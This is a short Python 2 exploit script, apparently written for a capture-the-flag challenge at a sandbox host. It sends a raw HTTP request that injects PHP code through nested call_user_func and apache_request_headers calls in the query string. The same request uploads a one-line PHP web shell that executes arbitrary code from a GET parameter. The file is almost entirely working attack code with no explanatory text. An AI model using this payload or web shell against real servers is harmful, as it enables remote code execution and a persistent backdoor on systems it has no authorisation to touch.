#!/usr/bin/env python2
# coding:utf-8
# import hackhttp

import socket
import gzip
from cStringIO import StringIO

raw = 'POST /?cmd=print_r(call_user_func(array_pop(apache_request_headers(call_user_func(array_pop(apache_request_headers())))))); HTTP/1.1\r\nHost: 61a1d20417ff3173fde4ba8aab4b0a7279f0b37e.sandbox.r-cursive.ml:1337\r\nContent-Length: 233\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryTslc9jNtxvlviFED\r\nAccept-Encoding: gzip\r\nAccept-Language: en,zh-CN;q=0.9,zh;q=0.8,zh-TW;q=0.7\r\nConnection: close\r\nT: phpinfo\r\n\r\n\r\n------WebKitFormBoundaryTslc9jNtxvlviFED\r\nContent-Disposition: form-data; name="file"; filename="s.php"\r\nContent-Type: text/php\r\n\r\n<?php call_user_func(create_function("", $_GET["c"]));\r\n------WebKitFormBoundaryTslc9jNtxvlviFED--\r\n'


def post(url, port):
    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sk.connect((url, port))
    sk.send(raw)
    response = ''
    temp = sk.recv(4096)
    while temp:
        response += temp
        temp = sk.recv(4096)
    sk.close()
    return response


res = post('61a1d20417ff3173fde4ba8aab4b0a7279f0b37e.sandbox.r-cursive.ml', 1337)
# f = gzip.GzipFile(fileobj=StringIO(res))
# try:
#     res = f.read()
# finally:
#     f.close()
print(res)
# print(post('127.0.0.1', 7777))
# print(gzip_uncompress(res))
# hh = hackhttp.hackhttp()
# code, head, body, redirect, log = hh.http(url, raw=raw)
# print(body)
# with open('t.html', 'w') as f:
#     f.write(body)
